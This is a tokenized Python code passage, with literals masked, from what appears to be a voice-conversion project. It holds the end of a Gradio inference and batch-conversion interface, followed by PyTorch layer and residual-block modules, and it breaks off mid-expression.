[ <EOL> os . path . join ( root , name ) <EOL> for root , _ , files in os . walk ( audio_root_relative , topdown = False ) <EOL> for name in files <EOL> if name . endswith ( tuple ( sup_audioext ) ) <EOL> and root == audio_root_relative <EOL> and "<STR_LIT>" not in name <EOL> ] <EOL> return ( <EOL> { "<STR_LIT>" : sorted ( names ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : sorted ( indexes_list ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : sorted ( audio_paths ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> def get_indexes ( ) : <EOL> indexes_list = [ <EOL> os . path . join ( dirpath , filename ) <EOL> for dirpath , _ , filenames in os . walk ( model_root_relative ) <EOL> for filename in filenames <EOL> if filename . endswith ( "<STR_LIT>" ) and "<STR_LIT>" not in filename <EOL> ] <EOL> return indexes_list if indexes_list else "<STR_LIT>" <EOL> def save_to_wav ( record_button ) : <EOL> if record_button is None : <EOL> pass <EOL> else : <EOL> path_to_file = record_button <EOL> new_name = datetime . datetime . now ( ) . strftime ( "<STR_LIT>" ) + "<STR_LIT>" <EOL> target_path = os . path . join ( audio_root_relative , os . path . basename ( new_name ) ) <EOL> shutil . move ( path_to_file , target_path ) <EOL> return target_path , output_path_fn ( target_path ) <EOL> def save_to_wav2 ( upload_audio ) : <EOL> file_path = upload_audio <EOL> formated_name = format_title ( os . path . basename ( file_path ) ) <EOL> target_path = os . path . join ( audio_root_relative , formated_name ) <EOL> if os . path . exists ( target_path ) : <EOL> os . remove ( target_path ) <EOL> shutil . copy ( file_path , target_path ) <EOL> return target_path , output_path_fn ( target_path ) <EOL> def delete_outputs ( ) : <EOL> gr . Info ( f"<STR_LIT>" ) <EOL> for root , _ , files in os . walk ( audio_root_relative , topdown = False ) : <EOL> for name in files : <EOL> if name . endswith ( tuple ( sup_audioext ) ) and name . __contains__ ( "<STR_LIT>" ) : <EOL> os . remove ( os . path . join ( root , name ) ) <EOL> def match_index ( model_file_value ) : <EOL> if model_file_value : <EOL> model_folder = os . path . dirname ( model_file_value ) <EOL> index_files = get_indexes ( ) <EOL> for index_file in index_files : <EOL> if os . path . dirname ( index_file ) == model_folder : <EOL> return index_file <EOL> return "<STR_LIT>" <EOL> def inference_tab ( ) : <EOL> default_weight = random . choice ( names ) if names else None <EOL> with gr . Row ( ) : <EOL> with gr . Row ( ) : <EOL> model_file = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = sorted ( names , key = lambda path : os . path . getsize ( path ) ) , <EOL> interactive = True , <EOL> value = default_weight , <EOL> allow_custom_value = True , <EOL> ) <EOL> index_file = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = get_indexes ( ) , <EOL> value = match_index ( default_weight ) if default_weight else "<STR_LIT>" , <EOL> interactive = True , <EOL> allow_custom_value = True , <EOL> ) <EOL> with gr . Column ( ) : <EOL> refresh_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> unload_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> unload_button . click ( <EOL> fn = lambda : ( <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) , <EOL> inputs = [ ] , <EOL> outputs = [ model_file , index_file ] , <EOL> ) <EOL> model_file . select ( <EOL> fn = lambda model_file_value : match_index ( model_file_value ) , <EOL> inputs = [ model_file ] , <EOL> outputs = [ index_file ] , <EOL> ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> with gr . Column ( ) : <EOL> upload_audio = gr . Audio ( <EOL> label = i18n ( "<STR_LIT>" ) , type = "<STR_LIT>" , editable = False <EOL> ) <EOL> with gr . Row ( ) : <EOL> audio = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = sorted ( audio_paths ) , <EOL> value = audio_paths [ <NUM_LIT> ] if audio_paths else "<STR_LIT>" , <EOL> interactive = True , <EOL> allow_custom_value = True , <EOL> ) <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) , open = False ) : <EOL> with gr . Column ( ) : <EOL> clear_outputs_infer = gr . Button ( <EOL> i18n ( "<STR_LIT>" ) <EOL> ) <EOL> output_path = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = ( <EOL> output_path_fn ( audio_paths [ <NUM_LIT> ] ) <EOL> if audio_paths <EOL> else os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> ) , <EOL> interactive = True , <EOL> ) <EOL> export_format = gr . Radio ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> split_audio = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> autotune = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> clean_audio = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> clean_strength = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = False , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> pitch = gr . Slider ( <EOL> minimum = - <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> filter_radius = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> index_rate = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> rms_mix_rate = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> protect = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> hop_length = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = False , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> with gr . Column ( ) : <EOL> f0method = gr . Radio ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> choices = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> convert_button1 = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> with gr . Row ( ) : <EOL> vc_output1 = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> ) <EOL> vc_output2 = gr . Audio ( label = i18n ( "<STR_LIT>" ) ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> input_folder_batch = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> value = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) , <EOL> interactive = True , <EOL> ) <EOL> output_folder_batch = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> value = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) , <EOL> interactive = True , <EOL> ) <EOL> with gr . Accordion ( i18n ( "<STR_LIT>" ) , open = False ) : <EOL> with gr . Column ( ) : <EOL> clear_outputs_batch = gr . Button ( <EOL> i18n ( "<STR_LIT>" ) <EOL> ) <EOL> export_format_batch = gr . Radio ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> choices = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> split_audio_batch = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> autotune_batch = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> clean_audio_batch = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> value = False , <EOL> interactive = True , <EOL> ) <EOL> clean_strength_batch = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = False , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> pitch_batch = gr . Slider ( <EOL> minimum = - <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> filter_radius_batch = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> index_rate_batch = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> rms_mix_rate_batch = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> protect_batch = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> hop_length_batch = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> step = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = False , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> ) <EOL> with gr . Column ( ) : <EOL> f0method_batch = gr . Radio ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> choices = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> ) <EOL> convert_button2 = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> with gr . Row ( ) : <EOL> vc_output3 = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> ) <EOL> def toggle_visible ( checkbox ) : <EOL> return { "<STR_LIT>" : checkbox , "<STR_LIT>" : "<STR_LIT>" } <EOL> def toggle_visible_hop_length ( f0method ) : <EOL> if f0method == "<STR_LIT>" or f0method == "<STR_LIT>" : <EOL> return { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" } <EOL> clean_audio . change ( <EOL> fn = toggle_visible , <EOL> inputs = [ clean_audio ] , <EOL> outputs = [ clean_strength ] , <EOL> ) <EOL> clean_audio_batch . change ( <EOL> fn = toggle_visible , <EOL> inputs = [ clean_audio_batch ] , <EOL> outputs = [ clean_strength_batch ] , <EOL> ) <EOL> f0method . change ( <EOL> fn = toggle_visible_hop_length , <EOL> inputs = [ f0method ] , <EOL> outputs = [ hop_length ] , <EOL> ) <EOL> f0method_batch . change ( <EOL> fn = toggle_visible_hop_length , <EOL> inputs = [ f0method_batch ] , <EOL> outputs = [ hop_length_batch ] , <EOL> ) <EOL> refresh_button . click ( <EOL> fn = change_choices , <EOL> inputs = [ ] , <EOL> outputs = [ model_file , index_file , audio ] , <EOL> ) <EOL> audio . change ( <EOL> fn = output_path_fn , <EOL> inputs = [ audio ] , <EOL> outputs = [ output_path ] , <EOL> ) <EOL> upload_audio . upload ( <EOL> fn = save_to_wav2 , <EOL> inputs = [ upload_audio ] , <EOL> outputs = [ audio , output_path ] , <EOL> ) <EOL> upload_audio . stop_recording ( <EOL> fn = save_to_wav , <EOL> inputs = [ upload_audio ] , <EOL> outputs = [ audio , output_path ] , <EOL> ) <EOL> clear_outputs_infer . click ( <EOL> fn = delete_outputs , <EOL> inputs = [ ] , <EOL> outputs = [ ] , <EOL> ) <EOL> clear_outputs_batch . click ( <EOL> fn = delete_outputs , <EOL> inputs = [ ] , <EOL> outputs = [ ] , <EOL> ) <EOL> convert_button1 . click ( <EOL> fn = run_infer_script , <EOL> inputs = [ <EOL> pitch , <EOL> filter_radius , <EOL> index_rate , <EOL> rms_mix_rate , <EOL> protect , <EOL> hop_length , <EOL> f0method , <EOL> audio , <EOL> output_path , <EOL> model_file , <EOL> index_file , <EOL> split_audio , <EOL> autotune , <EOL> clean_audio , <EOL> clean_strength , <EOL> export_format , <EOL> ] , <EOL> outputs = [ vc_output1 , vc_output2 ] , <EOL> ) <EOL> convert_button2 . click ( <EOL> fn = run_batch_infer_script , <EOL> inputs = [ <EOL> pitch_batch , <EOL> filter_radius_batch , <EOL> index_rate_batch , <EOL> rms_mix_rate_batch , <EOL> protect_batch , <EOL> hop_length_batch , <EOL> f0method_batch , <EOL> input_folder_batch , <EOL> output_folder_batch , <EOL> model_file , <EOL> index_file , <EOL> split_audio_batch , <EOL> autotune_batch , <EOL> clean_audio_batch , <EOL> clean_strength_batch , <EOL> export_format_batch , <EOL> ] , <EOL> outputs = [ vc_output3 ] , <EOL> ) <EOL> </s>
<s> import math <EOL> import torch <EOL> from torch import nn <EOL> from torch . nn import functional as F <EOL> from torch . nn import Conv1d <EOL> from torch . nn . utils import remove_weight_norm <EOL> from torch . nn . utils . parametrizations import weight_norm <EOL> from . import commons <EOL> from . commons import init_weights , get_padding <EOL> from . transforms import piecewise_rational_quadratic_transform <EOL> LRELU_SLOPE = <NUM_LIT> <EOL> class LayerNorm ( nn . Module ) : <EOL> def __init__ ( self , channels , eps = <NUM_LIT> ) : <EOL> super ( ) . __init__ ( ) <EOL> self . channels = channels <EOL> self . eps = eps <EOL> self . gamma = nn . Parameter ( torch . ones ( channels ) ) <EOL> self . beta = nn . Parameter ( torch . zeros ( channels ) ) <EOL> def forward ( self , x ) : <EOL> x = x . transpose ( <NUM_LIT> , - <NUM_LIT> ) <EOL> x = F . layer_norm ( x , ( self . channels , ) , self . gamma , self . beta , self . eps ) <EOL> return x . transpose ( <NUM_LIT> , - <NUM_LIT> ) <EOL> class ConvReluNorm ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> in_channels , <EOL> hidden_channels , <EOL> out_channels , <EOL> kernel_size , <EOL> n_layers , <EOL> p_dropout , <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> self . in_channels = in_channels <EOL> self . hidden_channels = hidden_channels <EOL> self . out_channels = out_channels <EOL> self . kernel_size = kernel_size <EOL> self . n_layers = n_layers <EOL> self . p_dropout = p_dropout <EOL> assert n_layers > <NUM_LIT> , "<STR_LIT>" <EOL> self . conv_layers = nn . ModuleList ( ) <EOL> self . norm_layers = nn . ModuleList ( ) <EOL> self . conv_layers . append ( <EOL> nn . Conv1d ( <EOL> in_channels , hidden_channels , kernel_size , padding = kernel_size // <NUM_LIT> <EOL> ) <EOL> ) <EOL> self . norm_layers . append ( LayerNorm ( hidden_channels ) ) <EOL> self . relu_drop = nn . Sequential ( nn . ReLU ( ) , nn . Dropout ( p_dropout ) ) <EOL> for _ in range ( n_layers - <NUM_LIT> ) : <EOL> self . conv_layers . append ( <EOL> nn . Conv1d ( <EOL> hidden_channels , <EOL> hidden_channels , <EOL> kernel_size , <EOL> padding = kernel_size // <NUM_LIT> , <EOL> ) <EOL> ) <EOL> self . norm_layers . append ( LayerNorm ( hidden_channels ) ) <EOL> self . proj = nn . Conv1d ( hidden_channels , out_channels , <NUM_LIT> ) <EOL> self . proj . weight . data . zero_ ( ) <EOL> self . proj . bias . data . zero_ ( ) <EOL> def forward ( self , x , x_mask ) : <EOL> x_org = x <EOL> for i in range ( self . n_layers ) : <EOL> x = self . conv_layers [ i ] ( x * x_mask ) <EOL> x = self . norm_layers [ i ] ( x ) <EOL> x = self . relu_drop ( x ) <EOL> x = x_org + self . proj ( x ) <EOL> return x * x_mask <EOL> class DDSConv ( nn . Module ) : <EOL> def __init__ ( self , channels , kernel_size , n_layers , p_dropout = <NUM_LIT> ) : <EOL> super ( ) . __init__ ( ) <EOL> self . channels = channels <EOL> self . kernel_size = kernel_size <EOL> self . n_layers = n_layers <EOL> self . p_dropout = p_dropout <EOL> self . drop = nn . Dropout ( p_dropout ) <EOL> self . convs_sep = nn . ModuleList ( ) <EOL> self . convs_1x1 = nn . ModuleList ( ) <EOL> self . norms_1 = nn . ModuleList ( ) <EOL> self . norms_2 = nn . ModuleList ( ) <EOL> for i in range ( n_layers ) : <EOL> dilation = kernel_size ** i <EOL> padding = ( kernel_size * dilation - dilation ) // <NUM_LIT> <EOL> self . convs_sep . append ( <EOL> nn . Conv1d ( <EOL> channels , <EOL> channels , <EOL> kernel_size , <EOL> groups = channels , <EOL> dilation = dilation , <EOL> padding = padding , <EOL> ) <EOL> ) <EOL> self . convs_1x1 . append ( nn . Conv1d ( channels , channels , <NUM_LIT> ) ) <EOL> self . norms_1 . append ( LayerNorm ( channels ) ) <EOL> self . norms_2 . append ( LayerNorm ( channels ) ) <EOL> def forward ( self , x , x_mask , g = None ) : <EOL> if g is not None : <EOL> x = x + g <EOL> for i in range ( self . n_layers ) : <EOL> y = self . convs_sep [ i ] ( x * x_mask ) <EOL> y = self . norms_1 [ i ] ( y ) <EOL> y = F . gelu ( y ) <EOL> y = self . convs_1x1 [ i ] ( y ) <EOL> y = self . norms_2 [ i ] ( y ) <EOL> y = F . gelu ( y ) <EOL> y = self . drop ( y ) <EOL> x = x + y <EOL> return x * x_mask <EOL> class WN ( torch . nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> hidden_channels , <EOL> kernel_size , <EOL> dilation_rate , <EOL> n_layers , <EOL> gin_channels = <NUM_LIT> , <EOL> p_dropout = <NUM_LIT> , <EOL> ) : <EOL> super ( WN , self ) . __init__ ( ) <EOL> assert kernel_size % <NUM_LIT> == <NUM_LIT> <EOL> self . hidden_channels = hidden_channels <EOL> self . kernel_size = ( kernel_size , ) <EOL> self . dilation_rate = dilation_rate <EOL> self . n_layers = n_layers <EOL> self . gin_channels = gin_channels <EOL> self . p_dropout = p_dropout <EOL> self . in_layers = torch . nn . ModuleList ( ) <EOL> self . res_skip_layers = torch . nn . ModuleList ( ) <EOL> self . drop = nn . Dropout ( p_dropout ) <EOL> if gin_channels != <NUM_LIT> : <EOL> cond_layer = torch . nn . Conv1d ( <EOL> gin_channels , <NUM_LIT> * hidden_channels * n_layers , <NUM_LIT> <EOL> ) <EOL> self . cond_layer = torch . nn . utils . parametrizations . weight_norm ( <EOL> cond_layer , name = "<STR_LIT>" <EOL> ) <EOL> for i in range ( n_layers ) : <EOL> dilation = dilation_rate ** i <EOL> padding = int ( ( kernel_size * dilation - dilation ) / <NUM_LIT> ) <EOL> in_layer = torch . nn . Conv1d ( <EOL> hidden_channels , <EOL> <NUM_LIT> * hidden_channels , <EOL> kernel_size , <EOL> dilation = dilation , <EOL> padding = padding , <EOL> ) <EOL> in_layer = torch . nn . utils . parametrizations . weight_norm ( <EOL> in_layer , name = "<STR_LIT>" <EOL> ) <EOL> self . in_layers . append ( in_layer ) <EOL> if i < n_layers - <NUM_LIT> : <EOL> res_skip_channels = <NUM_LIT> * hidden_channels <EOL> else : <EOL> res_skip_channels = hidden_channels <EOL> res_skip_layer = torch . nn . Conv1d ( hidden_channels , res_skip_channels , <NUM_LIT> ) <EOL> res_skip_layer = torch . nn . utils . parametrizations . weight_norm ( <EOL> res_skip_layer , name = "<STR_LIT>" <EOL> ) <EOL> self . res_skip_layers . append ( res_skip_layer ) <EOL> def forward ( self , x , x_mask , g = None , ** kwargs ) : <EOL> output = torch . zeros_like ( x ) <EOL> n_channels_tensor = torch . IntTensor ( [ self . hidden_channels ] ) <EOL> if g is not None : <EOL> g = self . cond_layer ( g ) <EOL> for i in range ( self . n_layers ) : <EOL> x_in = self . in_layers [ i ] ( x ) <EOL> if g is not None : <EOL> cond_offset = i * <NUM_LIT> * self . hidden_channels <EOL> g_l = g [ : , cond_offset : cond_offset + <NUM_LIT> * self . hidden_channels , : ] <EOL> else : <EOL> g_l = torch . zeros_like ( x_in ) <EOL> acts = commons . fused_add_tanh_sigmoid_multiply ( x_in , g_l , n_channels_tensor ) <EOL> acts = self . drop ( acts ) <EOL> res_skip_acts = self . res_skip_layers [ i ] ( acts ) <EOL> if i < self . n_layers - <NUM_LIT> : <EOL> res_acts = res_skip_acts [ : , : self . hidden_channels , : ] <EOL> x = ( x + res_acts ) * x_mask <EOL> output = output + res_skip_acts [ : , self . hidden_channels : , : ] <EOL> else : <EOL> output = output + res_skip_acts <EOL> return output * x_mask <EOL> def remove_weight_norm ( self ) : <EOL> if self . gin_channels != <NUM_LIT> : <EOL> torch . nn . utils . remove_weight_norm ( self . cond_layer ) <EOL> for l in self . in_layers : <EOL> torch . nn . utils . remove_weight_norm ( l ) <EOL> for l in self . res_skip_layers : <EOL> torch . nn . utils . remove_weight_norm ( l ) <EOL> class ResBlock1 ( torch . nn . Module ) : <EOL> def __init__ ( self , channels , kernel_size = <NUM_LIT> , dilation = ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) : <EOL> super ( ResBlock1 , self ) . __init__ ( ) <EOL> self . convs1 = nn . ModuleList ( <EOL> [ <EOL> weight_norm ( <EOL> Conv1d ( <EOL> channels , <EOL> channels , <EOL> kernel_size , <EOL> <NUM_LIT> , <EOL> dilation = dilation [ <NUM_LIT> ] , <EOL> padding = get_padding ( kernel_size , dilation [ <NUM_LIT> ] ) , <EOL> ) <EOL> ) , <EOL> weight_norm ( <EOL> Conv1d ( <EOL> channels , <EOL> channels , <EOL> kernel_size , <EOL> <NUM_LIT> , <EOL> dilation = dilation [ <NUM_LIT> ] , <EOL> padding = get_padding ( kernel_size , dilation [ <NUM_LIT> ] ) , <EOL> ) <EOL> ) , <EOL> weight_norm ( <EOL> Conv1d ( <EOL> channels , <EOL> channels , <EOL> kernel_size , <EOL> <NUM_LIT> , <EOL> dilation = dilation [ <NUM_LIT> ] , <EOL> padding = get_padding ( kernel_size , dilation [ <NUM_LIT> ] ) , <EOL> ) <EOL> ) , <EOL> ] <EOL> ) <EOL> self . convs1 . apply ( init_weights ) <EOL> self . convs2 = nn . ModuleList ( <EOL> [ <EOL> weight_norm ( <EOL> Conv1d ( <EOL> channels , <EOL> channels , <EOL> kernel_size , <EOL> <NUM_LIT> , <EOL> dilation = <NUM_LIT> , <EOL> padding = get_padding ( kernel_size , <NUM_LIT> ) , <EOL> ) <EOL> ) , <EOL> weight_norm ( <EOL> Conv1d ( <EOL> channels , <EOL> channels , <EOL> kernel_size , <EOL> <NUM_LIT> , <EOL> dilation = <NUM_LIT> , <EOL> padding = get_padding ( kernel_size , <NUM_LIT> ) , <EOL> ) <EOL> ) , <EOL> weight_norm ( <EOL> Conv1d ( <EOL> channels , <EOL> channels , <EOL> kernel_size , <EOL> <NUM_LIT> , <EOL> dilation = <NUM_LIT> , <EOL> padding = get_padding ( kernel_size , <NUM_LIT> ) , <EOL> ) <EOL> ) , <EOL> ] <EOL> ) <EOL> self . convs2 . apply ( init_weights ) <EOL> def forward ( self , x , x_mask = None ) : <EOL> for c1 , c2 in zip ( self . convs1 , self . convs2 ) : <EOL> xt = F . leaky_relu ( x , LRELU_SLOPE ) <EOL> if x_mask is not None : <EOL> xt = xt * x_mask <EOL> xt = c1 ( xt ) <EOL> xt = F . leaky_relu ( xt , LRELU_SLOPE ) <EOL> if x_mask is not None : <EOL> xt = xt * x_mask <EOL> xt = c2 ( xt ) <EOL> x = xt + x <EOL> if x_mask is not None : <EOL> x = x * x_mask <EOL> return x <EOL> def remove_weight_norm ( self ) : <EOL> for l in self . convs1 : <EOL> remove_weight_norm ( l ) <EOL> for l in self . convs2 : <EOL> remove_weight_norm ( l ) <EOL> class ResBlock2 ( torch . nn . Module ) : <EOL> def __init__ ( self , channels , kernel_size = <NUM_LIT> , dilation = ( <NUM_LIT> , <NUM_LIT> ) ) : <EOL> super ( ResBlock2 , self ) . __init__ ( ) <EOL> self . convs = nn . ModuleList ( <EOL> [ <EOL> weight_norm ( <EOL> Conv1d ( <EOL> channels , <EOL> channels , <EOL> kernel_size , <EOL> <NUM_LIT> , <EOL> dilation = dilation [ <NUM_LIT> ] , <EOL> padding = get_padding ( kernel_size , dilation [ <NUM_LIT> ] ) , <EOL> ) <EOL> ) , <EOL> weight_norm ( <EOL> Conv1d ( <EOL> channels , <EOL> channels , <EOL> kernel_size , <EOL> <NUM_LIT> , <EOL> dilation = dilation [ <NUM_LIT> ] , <EOL> padding = get_padding ( kernel_size , dilation [ <NUM_LIT> ] ) , <EOL> ) <EOL> ) , <EOL> ] <EOL> ) <EOL> self . convs . apply ( init_weights ) <EOL> def forward ( self , x , x_mask = None ) : <EOL> for c in self . convs : <EOL> xt = F . leaky_relu ( x , LRELU_SLOPE ) <EOL> if x_mask is not None : <EOL> xt = xt * x_mask <EOL> xt = c ( xt ) <EOL> x = xt + x <EOL> if x_mask is not None : <EOL> x = x * x_mask <EOL> return x <EOL> def remove_weight_norm ( self ) : <EOL> for l in self . convs : <EOL> remove_weight_norm ( l ) <EOL> class Log ( nn . Module ) : <EOL> def forward ( self , x , x_mask , reverse = False , ** kwargs ) : <EOL> if not reverse : <EOL> y = torch . log ( torch . clamp_min ( x , <NUM_LIT> ) ) * x_mask <EOL> logdet = torch . sum ( - y , [ <NUM_LIT> , <NUM_LIT> ] ) <EOL> return y , logdet <EOL> else : <EOL> x = torch . exp ( x ) * x_mask <EOL> return x <EOL> class Flip ( nn . Module ) : <EOL> def forward ( self , x , * args , reverse = False , ** kwargs ) : <EOL> x = torch . flip ( x , [ 